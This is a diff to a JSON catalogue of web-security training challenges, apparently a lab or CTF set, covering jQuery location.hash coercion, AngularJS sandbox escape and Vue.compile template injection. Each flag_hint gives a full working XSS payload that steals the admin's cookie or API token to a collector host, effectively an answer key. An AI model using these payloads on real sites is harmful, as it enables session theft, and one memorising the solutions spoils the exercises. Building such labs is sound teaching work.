@@ -770,20 +770,21 @@
         "slug": "jquery-location-hash-selector",
         "title": "jQuery(location.hash) Selector-to-HTML Coercion",
         "difficulty": "practitioner",
-        "description": "A legacy help-centre scrolls to a section on load with $(location.hash). When jQuery < 3.5 is passed a string that looks like HTML it constructs elements instead of selecting them, thanks to htmlPrefilter regex quirks that also let payloads survive.",
-        "objective": "Craft a URL whose hash coerces jQuery into constructing a new element with an event handler that fires; use it to steal the admin's session cookie via the OOB collector.",
-        "flag_hint": "OOB collector receives the cookie; /solve prints the flag when the value matches the current admin session cookie.",
+        "description": "A legacy help-centre scrolls to a section on load by passing the URL fragment to jQuery: $(decodeURIComponent(location.hash.slice(1))). jQuery's $() is overloaded — handed an HTML-looking string it CONSTRUCTS elements instead of selecting them, so a fragment like <img src=x onerror=...> builds an <img> whose onerror fires. Ships the vendored, EOL jQuery 3.4.1 (< 3.5 widens what counts as HTML) — that version IS the lesson.",
+        "objective": "Craft a URL whose #fragment coerces jQuery's $() into constructing an element with an event handler, running JS in the admin bot's browser to steal the admin session cookie to the OOB collector, then POST /solve.",
+        "flag_hint": "Submit /#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> (URL-encoded) to POST /report; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "jQuery selector-to-element coercion",
           "location.hash sinks",
           "htmlPrefilter regressions before 3.5"
         ],
         "tech_stack": [
-          "Static HTML",
-          "jQuery 3.4.1",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "jQuery 3.4.1 (vendored; $(hash) selector-to-HTML quirk)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "CVE-2020-11022 and CVE-2020-11023 (jQuery htmlPrefilter/regex regressions)"
       },
@@ -994,20 +995,21 @@
         "slug": "angularjs-sandbox-escape-172",
         "title": "AngularJS 1.7.2 Sandbox Escape (Client-Side Template Injection)",
         "difficulty": "expert",
-        "description": "A checkout confirmation page uses AngularJS 1.7.2 and interpolates a query parameter as an ng-bind expression: <div ng-app>{{name}}</div>. AngularJS 1.7 removed the sandbox and famously exposes constructor-based gadgets even in earlier versions.",
-        "objective": "Deliver a URL that, when opened by the admin bot, escapes the AngularJS expression sandbox and exfiltrates the admin's cookie to the OOB collector.",
-        "flag_hint": "OOB collector receives the cookie; /solve prints the flag on match.",
+        "description": "A checkout confirmation page bootstrapped with AngularJS 1.7.2 (ng-app) reflects ?name=, HTML-ESCAPED, into the text of the Angular-compiled region. Escaping stops <script>/attribute injection but not {{ }} interpolation — AngularJS 1.6+ removed the expression sandbox, so a {{ constructor.constructor(...)() }} gadget reaches the Function constructor. Client-side template injection.",
+        "objective": "Deliver a URL whose ?name= is an AngularJS {{}} expression that escapes to arbitrary JS in the admin bot's browser and exfiltrates the admin cookie to the OOB collector, then POST /solve.",
+        "flag_hint": "Submit /?name={{constructor.constructor(\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\")()}} (URL-encoded) to POST /report; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "client-side template injection",
           "AngularJS sandbox-escape gadgets (constructor.constructor)",
           "why the AngularJS team abandoned the sandbox"
         ],
         "tech_stack": [
-          "Static site",
-          "AngularJS 1.7.2 pinned",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "AngularJS 1.7.2 (vendored; sandbox-less {{}} template injection)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "PortSwigger's AngularJS sandbox-escape series by Gareth Heyes and Mario Heiderich (2015-2018)"
       },
@@ -1015,22 +1017,21 @@
         "slug": "vue2-template-compile-injection",
         "title": "Vue 2 Template Injection via Runtime Vue.compile",
         "difficulty": "expert",
-        "description": "A Nuxt 2 dashboard uses v-html for one field (sanitised) and Vue.compile() at runtime on another field so that customers can supply custom templates for a widget. The compile-time surface accepts full Vue expressions.",
-        "objective": "Deliver content that triggers Vue.compile on user input, executes a template expression, and POSTs the /me API response to the OOB collector.",
-        "flag_hint": "OOB collector receives the /me body; /solve returns the flag when the admin's /me content is received.",
+        "description": "A dashboard lets customers supply a custom widget template which the admin dashboard compiles at runtime with Vue.compile() (Vue 2.7). The template is embedded in a hidden div (HTML-escaped) and read via textContent (which decodes it), so the raw template reaches the compiler; Vue 2 evaluates {{ }} expressions in the component scope, and constructor.constructor reaches Function. Client-side template injection.",
+        "objective": "Deliver a widget template that Vue.compile executes in the admin bot's browser, fetches the admin-only /me (same-origin, cookie sent), and beacons the token to the OOB collector, then POST /solve.",
+        "flag_hint": "POST /widget {\"template\":\"<span>{{ constructor.constructor(\\\"fetch('/me').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?m='+encodeURIComponent(t)})\\\")() }}</span>\"}; read the exfiltrated token via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /me and /admin/dashboard are 403 for you.",
         "skills_taught": [
           "Vue.compile as a dangerous sink",
           "difference between v-html and runtime template compilation",
           "framework-specific CSTI"
         ],
         "tech_stack": [
-          "Node 20",
-          "Nuxt 2.17",
-          "Vue 2.7",
-          "PostgreSQL 16",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "Vue 2.7.16 (vendored full build; runtime Vue.compile of user input)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "CVE-2024-6783 (Vue 2 template-compiler XSS) and PortSwigger's Vue.js CSTI research"
       },
